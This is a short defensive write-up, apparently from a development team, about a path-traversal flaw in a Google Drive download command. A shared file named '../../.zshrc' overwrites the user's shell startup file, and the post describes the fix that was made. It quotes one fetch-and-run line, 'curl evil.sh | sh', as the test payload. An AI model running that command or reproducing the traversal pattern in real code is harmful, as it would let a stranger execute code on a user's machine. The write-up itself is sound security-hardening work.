# The name was not ours

The audit started with a question nobody had asked about `co gdrive get`:
who chooses the file name?

Not the user. The user chooses the folder, with `--to` or by standing in it.
The name comes from Drive, and Drive lets anyone who can share a file with you
call it anything, slashes included. So we made one called `../../.zshrc`,
containing a single line, `curl evil.sh | sh`, and "shared" it into a fake
Drive. Then we downloaded it into `project/downloads/`.

The download reported success. The file was not in `downloads/`. It was two
levels up, and it had replaced `.zshrc` — the file every new terminal runs
on start. The code was three honest lines: take the folder, append the name,
write the bytes. Each line was right about what it did, and together they let a
stranger's file name decide where on disk we wrote.

Two quieter problems sat in the same three lines. `write_bytes` replaces
whatever is there, so downloading `Report.pdf` next to your own `Report.pdf`
silently destroyed yours. And the agent tool had no boundary at all: a model
that was told to "save it to my home folder" could put Drive content anywhere
the process could write.

None of this was new to the codebase. `Outlook.download_attachments` hit the
same shape months ago — attachment names are sender-controlled — and already
did the careful thing. The fix was to stop treating Drive as more trustworthy
than email. Now a Drive name keeps only its last segment, control characters
become `_` so a name cannot paint the terminal, and the file is opened with
`O_EXCL | O_NOFOLLOW`: if the name is taken, or a symlink is waiting there, the
download becomes `Report-1.pdf` instead of writing through. The agent tool
stays inside the project unless its owner passes `allow_external_downloads`;
the CLI passes it, because there a person typed the path.

The lesson is about where a value came from, not what it looks like. A file
name looks like ours because it sits in our code next to our folder. It was
written by whoever shared the file. The tests now hand `download()` exactly
that stranger's name — `../../.zshrc`, a name with an escape sequence in it, a
name already taken, a name that is a symlink — and check the victim file, not
the success message, because the success message was the part that never lied.
